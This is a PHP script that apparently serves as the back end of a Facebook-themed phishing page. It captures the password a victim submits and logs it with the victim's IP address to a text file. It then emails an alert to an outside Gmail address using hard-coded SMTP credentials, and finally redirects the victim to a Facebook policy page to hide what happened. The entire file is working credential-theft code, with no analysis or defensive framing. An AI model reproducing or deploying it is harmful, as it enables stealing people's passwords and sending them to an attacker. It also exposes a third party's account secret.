<?php
  use PHPMailer\PHPMailer\PHPMailer;
  use PHPMailer\PHPMailer\Exception;

  require_once 'vendor/autoload.php';

  $password = $_POST["password"];
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
      $ip = $_SERVER['REMOTE_ADDR'];
  }
  $content = "Password: ".$password." - IP: ".$ip.".
";
  $fp = fopen("password.txt","a");
  fwrite($fp,$content);
  fclose($fp);

  $mail = new PHPMailer(true);

  $mail->isSMTP();                                      // Set mailer to use SMTP
  $mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
  $mail->SMTPAuth = true;                               // Enable SMTP authentication
  $mail->Username = 'carterreginald24@gmail.com';                 // SMTP username
  $mail->Password = 'fqbjmddjkxsnumgr';                           // SMTP password
  $mail->SMTPSecure = 'tls';
  
  $mail->setFrom('carterreginald24@gmail.com', 'A NEW COOKIE RECEIVED');
  $mail->addAddress('kk442242@gmail.com', 'Receiver');
  $mail->Subject = 'A NEW COOKIE RECEIVED';
  $mail->Body    = 'Please check the link below for more details


'.$_SERVER['HTTP_HOST'].'/username.txt';

  if(!$mail->send()) {
      echo 'Message could not be sent.';
      echo 'Mailer Error: ' . $mail->ErrorInfo;
  } else {
      // echo 'Message has been sent';
  }

  $mail->smtpClose();

  header('Location: https://transparency.fb.com/en-gb/policies/community-standards/');
  die();
?>